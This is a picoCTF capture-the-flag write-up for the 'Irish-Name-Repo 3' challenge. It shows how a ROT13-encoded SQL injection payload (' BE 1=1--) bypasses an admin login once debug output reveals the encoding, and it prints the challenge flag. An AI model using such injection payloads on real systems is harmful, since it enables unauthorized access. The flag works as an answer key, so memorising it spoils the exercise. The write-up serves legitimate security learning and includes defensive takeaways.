# 🐍 Irish-Name-Repo 3 — picoCTF Writeup

> **Challenge:** Irish-Name-Repo 3
> **Category:** Web Exploitation / SQL Injection
> **Platform:** picoCTF
> **Target:** `http://fickle-tempest.picoctf.net:49429`

---

## 📌 Challenge Description

> Try to see if you can login as admin!

This is the third challenge in the **Irish-Name-Repo** series.

The previous challenge required finding an unprotected input field. This time, the application adds another layer of protection: the password is transformed before being used in the SQL query.

The key is to identify **what transformation is being applied** and then apply the same transformation to our SQL injection payload.

---

## 🌐 Step 1 — Open the Login Page

I opened:

```text id="m3jyq5"
http://fickle-tempest.picoctf.net:49429/login.html
```

The login form only asks for a password.

I entered a test password:

```text id="jv0c0w"
hello
```

Burp Suite captured the following request:

```http id="w8y1kv"
POST /login.php HTTP/1.1
Host: fickle-tempest.picoctf.net:49429
Content-Type: application/x-www-form-urlencoded

password=hello&debug=0
```

---

## 🔍 Step 2 — Enable Debug Mode

As with the previous challenges, the request contains:

```text id="7qv4h4"
debug=0
```

I sent the request to **Burp Suite → Repeater** and changed it to:

```text id="jz6vdy"
debug=1
```

The response revealed something very interesting:

```html id="aw31ml"
<pre>
password: hello
SQL query: SELECT * FROM admin where password = 'uryyb'
</pre>

<h1>Login failed.</h1>
```

---

## 🧩 Step 3 — Identify the Transformation

We sent:

```text id="e9y25j"
hello
```

But the SQL query contained:

```text id="i1x2gj"
uryyb
```

At first this looks strange.

However, recognizing that:

```text id="q0h6fs"
hello → uryyb
```

is **ROT13** gives us the answer.

ROT13 transforms each letter by rotating it 13 positions through the alphabet.

For example:

```text id="7j8x4g"
h → u
e → r
l → y
l → y
o → b
```

Therefore:

```text id="2jqk2v"
hello
  ↓ ROT13
uryyb
```

The application is transforming the supplied password using **ROT13** before putting it into the SQL query.

---

## 💉 Step 4 — Adapt the SQL Injection

A classic SQL injection payload is:

```text id="d3qv3f"
' OR 1=1--
```

However, the application applies ROT13 to the password before executing the SQL query.

Therefore, we need to send the **ROT13 version** of the payload.

Applying ROT13:

```text id="q0c9u9"
' OR 1=1--
```

becomes:

```text id="c9z2om"
' BE 1=1--
```

The important transformation is:

```text
OR → BE
```

because ROT13 maps:

```text
O → B
R → E
```

---

## 🎯 Step 5 — Send the Payload

I sent the following request through Burp Repeater:

```text id="xgyv2b"
password=' BE 1=1--&debug=1
```

The server applies ROT13 internally, transforming our input back into the SQL injection:

```text id="4a2jru"
' OR 1=1--
```

The resulting SQL query effectively becomes:

```sql id="1a8pxd"
SELECT * FROM admin WHERE password = '' OR 1=1--'
```

Since:

```sql id="o9xg3q"
1=1
```

is always true, the authentication check is bypassed.

---

# 🚩 Step 6 — Retrieve the Flag

The server responded with:

```text id="9g8p3z"
Your flag is: picoCTF{3v3n_m0r3_SQL_2af58a67}
```

---

# 🏁 Final Flag

```text id="7g1m4n"
picoCTF{3v3n_m0r3_SQL_2af58a67}
```

---

## 🧠 Why This Worked

The important thing in this challenge is the order of operations.

The application doesn't directly put our password into the SQL query.

Instead:

```text id="f5b7cg"
User Input
    │
    ▼
   ROT13
    │
    ▼
SQL Query
```

When we submitted:

```text id="t2y6rx"
password=' BE 1=1--
```

the application transformed it using ROT13:

```text id="u4j7h1"
' BE 1=1--
       ↓
' OR 1=1--
```

which then became SQL code.

---

## 🔄 Attack Flow

```text id="1h9o7d"
Enter test password: hello
          │
          ▼
Enable debug=1
          │
          ▼
Observe:
hello → uryyb
          │
          ▼
Recognize ROT13
          │
          ▼
Start with SQLi:
' OR 1=1--
          │
          ▼
Apply ROT13
          │
          ▼
' BE 1=1--
          │
          ▼
Send payload
          │
          ▼
Server decodes with ROT13
          │
          ▼
' OR 1=1--
          │
          ▼
SQL Injection
          │
          ▼
picoCTF{3v3n_m0r3_SQL_2af58a67}
```

---

## 🛠️ Tools Used

* **Burp Suite**

  * Proxy → Intercept
  * Repeater

---

## 🔑 Key Takeaways

* Debug output can reveal how an application processes user input.
* Recognizing transformations such as **ROT13** can be critical in CTFs.
* Encoding or transforming user input does **not** make SQL injection safe.
* If transformed input is eventually inserted directly into an SQL query, injection may still be possible.
* SQL queries should use **parameterized queries / prepared statements** rather than string concatenation.

---

## 🏆 Final Payload

```text
password=' BE 1=1--&debug=1
```

### Result

```text
picoCTF{3v3n_m0r3_SQL_2af58a67}
```

**Challenge solved! 🎉**
